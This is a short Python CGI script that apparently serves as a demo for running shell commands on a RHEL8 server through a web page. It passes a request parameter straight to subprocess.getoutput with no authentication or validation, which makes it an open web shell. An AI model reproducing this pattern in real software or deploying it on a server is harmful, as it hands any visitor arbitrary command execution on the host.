#!/usr/bin/python3

print("content-type:text/html")
print()
import cgi
import subprocess

print("<html>")
print("<head><title>RHEL8</title></head>")
print("<body>")
print("<pre>")

x=cgi.FieldStorage()
o=x.getvalue("command")
#print(o)
value=subprocess.getoutput(o)
print("<b> {} </b>".format(value))
print("Executed Successfully !!")

print("</pre>")
print("</body>")
